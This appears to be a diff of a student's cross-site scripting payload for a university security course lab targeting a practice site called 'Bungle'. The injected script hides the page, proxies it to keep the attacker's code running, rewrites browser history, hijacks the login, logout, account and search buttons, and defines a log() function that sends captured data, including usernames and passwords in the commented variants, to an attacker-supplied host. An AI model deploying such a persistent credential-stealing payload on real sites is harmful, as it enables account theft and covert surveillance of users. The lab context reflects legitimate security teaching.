@@ -59,56 +59,60 @@ function payload(attacker) {
     // Note that you can proxy the main page, or a search page!
 	function proxy(href, spying_url) {
 
-        	// Make all current HTML invisible.
-        	$('html').hide();
+        // Make all current HTML invisible.
+        $('html').hide();
 
-        	// overwrites current HTML. Execute a callback function when load has finished.
-        	$('html').load(href, function() {
+        // overwrites current HTML. Execute a callback function when load has finished.
+        $('html').load(href, function() {
 
-                var target = `http://bungle-cs461.csl.illinois.edu/`;
+            var target = `http://bungle-cs461.csl.illinois.edu/`;
 
-                function updateCurrentPage(newHtml, newTitle, newPage) {
-                    $("html").html(newHtml);
-                    var currentTitle = newTitle;
-                    var currentPage = newPage;
-                    var stateDict = {
-                        "html": $("html").html(),
-                        "title": currentTitle,
-                        "page": currentPage
-                    };
-                    window.history.replaceState(stateDict, currentTitle, currentPage);
-                    $("title")[0].text = currentTitle;
-                    console.log("test");
-                    // injectIntoPage();
-                    // logPage();
+            function updateCurrentPage(newHtml, newTitle, newPage) {
+                $("html").html(newHtml);
+                var currentTitle = newTitle;
+                var currentPage = newPage;
+                var stateDict = {
+                    "html": $("html").html(),
+                    "title": currentTitle,
+                    "page": currentPage
+                };
+                window.history.replaceState(stateDict, currentTitle, currentPage);
+                $("title")[0].text = currentTitle;
+                console.log("test");
+                inject();
+                // injectIntoPage();
+                // logPage();
+            }
+
+            function updateHistory() {
+                var stateDict = {
+                    "html": $("body").html(),
+                    "title": "currentTitle",
+                    "page": "currentPage"
                 }
-
-                function updateHistory() {
-                    var stateDict = {
-                        "html": $("body").html(),
-                        "title": "currentTitle",
-                        "page": "currentPage"
-                    }
-                    window.history.pushState(stateDict, "currentTitle", "currentPage");
-                }
-                
-                function log(data) {
-                    console.log($.param(data))
-                    $.get(attacker, data);
-                    // console.log("test");
-	            }
-
+                window.history.pushState(stateDict, "currentTitle", "currentPage");
+            }
+            
+            function log(data) {
+                console.log($.param(data))
+                $.get(attacker, data);
+                // console.log("test");
+            }
+            
+            function inject(){
                 console.log("Original Page");
                 $("title", window.parent.document).text("NOT Bungle!");
 
                 $(".form-inline").attr("onsubmit", "return false");
 
+                // LOG IN BUTTON
                 $("html").contents().find("#log-in-btn").click(function(event){
-					$("head title", window.parent.document).text("NOT Bungle!");
-					history.pushState(null, null, target);
-					var usern=$("html").contents().find("#username").val();
-					var passw=$("html").contents().find("#userpass").val();
-					
+                    console.log("Log in attempted");
+                    // $("head title", window.parent.document).text("NOT Bungle!");
+                    history.pushState(null, null, target);
+                    var usern=$("html").contents().find("#username").val();
+                    var passw=$("html").contents().find("#userpass").val();
+                    
                     $.post(
                         "http://bungle-cs461.csl.illinois.edu/login",
                         {
@@ -120,67 +124,146 @@ function payload(attacker) {
                         updateCurrentPage(data, "NOT Bungle!", "./");
                         console.log("Update curr page");
                         return false;
-                    }
-                    )
-                    .fail(function (jqXHR, textStatus, error) {
+                    });
+                });
+
+                // LOG OUT BUTTON
+                $("html").contents().find("#log-out-btn").click(function(event){
+                    console.log("Logout attempted");
+                    // $("head title", window.parent.document).text("Bungle!");
+                    history.pushState(null, null, target);
+                    var usern=$("#html").contents().find("#username").val();
+                    var passw=$("#html").contents().find("#userpass").val();
+                    // log({event: "login", user: usern, pass: passw});
+                    $.post("./logout")
+                    .done(function(data) {
+                        // log({event: "logout", user: currentUser});
+                        currentUser = ""
                         // updateHistory();
-                        textStatus = textStatus.charAt(0).toUpperCase() + textStatus.slice(1)
-                        var newTitle = textStatus + ": " + jqXHR.status + " " + error;
-                        updateCurrentPage(jqXHR.responseText, newTitle, "./login");
-                        console.log("Login Failed");
+                        updateCurrentPage(data, "NOT Bungle!", "./");
                         return false;
                     });
-                    console.log("Log in");
-                    // proxy("./login", attacker);
-                // var loginButton = $("#log-in-btn");
-                // var createAccountButton = $("#new-account-btn");
+                });
 
-                // var usernameField = $("#username")[0];
-                // var userpassField = $("#userpass")[0];
+                // NEW ACCOUNT BUTTON
+                $("html").contents().find("#new-account-btn").click(function(event){
+					$("head title", window.parent.document).text("Bungle!");
+					history.pushState(null, null, target);
+					var usern=$("html").contents().find("#username").val();
+					var passw=$("html").contents().find("#userpass").val();
+					// log({event: "login", user: usern, pass: passw});
 
-                // $(".form-inline").attr("onsubmit", "return false");
-
-                // /* login button */
-                // if (loginButton) {
-                //     loginButton.click(function() {
-                //         if (usernameField.value && userpassField.value) {
-                //             console.log("attempt login");
-
-                //             $.post(
-                //                 "http://bungle-cs461.csl.illinois.edu/login",
-                //                 {
-                //                     username: usernameField.value,
-                //                     password: userpassField.value
-                //                 }
-                //             )
-                //             .done(function(data) {
-                //                 currentUser = usernameField.value
-                //                 log({event: "login", user: currentUser, pass: userpassField.value});
-                //                 // updateHistory();
-                //                 updateCurrentPage(data, "Bungle!", "./");
-                //                 return false;
-                //             })
-                //             .fail(function (jqXHR, textStatus, error) {
-                //                 // updateHistory();
-                //                 textStatus = textStatus.charAt(0).toUpperCase() + textStatus.slice(1)
-                //                 var newTitle = textStatus + ": " + jqXHR.status + " " + error;
-                //                 updateCurrentPage(jqXHR.responseText, newTitle, "./login");
-                //                 return false;
-                //             });
-                //         }
-                //     });
-                // }
-
+                    $.post(
+                        "http://bungle-cs461.csl.illinois.edu/create",
+                        {
+                            username: usern,
+                            password: passw
+                        }
+                    )
+                    .done(function(data) {
+                        // currentUser = usernameField.value
+                        // log({event: "login", user: currentUser, pass: userpassField.value});
+                        // updateHistory();
+                        updateCurrentPage(data, "Bungle!", "./");
+                        return false;
+                    })
 				});
 
-                // Show new HTML
-                $('html').show();
+                //BUNGLE BUTTON
+                $("html").contents().find("#bungle-lnk").click(function(event){
+                    $("html").contents().find("#bungle-lnk").removeAttr("href");
+                    history.pushState(null, null, target);
+                    $.get("./")
+                    .done(function(data) {
+                        // updateHistory();
+                        updateCurrentPage(data, "NOT Bungle!", "./");
+                        return false;
+                    });
+                });
 
-                // TODO implement spying while being stealthy and persistent. Remove the alert.
-                // alert("Notice that although we injected code into the search page, you see here the main page!")
+                // SEARCH BUTTON
+                $("html").contents().find("#search-btn").click(function(event){
+					// $("head title", window.parent.document).text("Search Results");
+					var q=$("html").contents().find("#query").val();
+					var new_target="http://bungle-cs461.csl.illinois.edu/search?q="+q
+					history.pushState(null, null, new_target);
+					// log({event: "nav", user: $("#fake_page").contents().find("#logged-in-user").text(), url:new_target});
+                    $.get(new_target)
+                    .done(function(data) {
+                        // updateHistory();
+                        updateCurrentPage(data, "Search Results", new_target);
+                        return false;
+                    });
+				});
 
-            });
-    	}
+                // SEARCH AGAIN BUTTON
+                $("html").contents().find("#search-again-btn").click(function(event){
+                    $("html").contents().find("#search-again-btn").removeAttr("href");
+					// $("head title", window.parent.document).text("Search Results");
+					// var q=$("html").contents().find("#query").val();
+					// var new_target="http://bungle-cs461.csl.illinois.edu/search?q="+q
+					history.pushState(null, null, target);
+					// log({event: "nav", user: $("#fake_page").contents().find("#logged-in-user").text(), url:new_target});
+                    $.get("./")
+                    .done(function(data) {
+                        // updateHistory();
+                        updateCurrentPage(data, "Search Results", "./");
+                        return false;
+                    });
+				});
+
+                
+            }
+
+
+                                    // proxy("./login", attacker);
+            // var loginButton = $("#log-in-btn");
+            // var createAccountButton = $("#new-account-btn");
+
+            // var usernameField = $("#username")[0];
+            // var userpassField = $("#userpass")[0];
+
+            // $(".form-inline").attr("onsubmit", "return false");
+
+            // /* login button */
+            // if (loginButton) {
+            //     loginButton.click(function() {
+            //         if (usernameField.value && userpassField.value) {
+            //             console.log("attempt login");
+
+            //             $.post(
+            //                 "http://bungle-cs461.csl.illinois.edu/login",
+            //                 {
+            //                     username: usernameField.value,
+            //                     password: userpassField.value
+            //                 }
+            //             )
+            //             .done(function(data) {
+            //                 currentUser = usernameField.value
+            //                 log({event: "login", user: currentUser, pass: userpassField.value});
+            //                 // updateHistory();
+            //                 updateCurrentPage(data, "Bungle!", "./");
+            //                 return false;
+            //             })
+            //             .fail(function (jqXHR, textStatus, error) {
+            //                 // updateHistory();
+            //                 textStatus = textStatus.charAt(0).toUpperCase() + textStatus.slice(1)
+            //                 var newTitle = textStatus + ": " + jqXHR.status + " " + error;
+            //                 updateCurrentPage(jqXHR.responseText, newTitle, "./login");
+            //                 return false;
+            //             });
+            //         }
+            //     });
+            // }
+                inject();
+            // Show new HTML
+            $('html').show();
+
+            // TODO implement spying while being stealthy and persistent. Remove the alert.
+            // alert("Notice that although we injected code into the search page, you see here the main page!")
+
+        });
+    }
     //Call Proxy
 	proxy('./', attacker)
 }
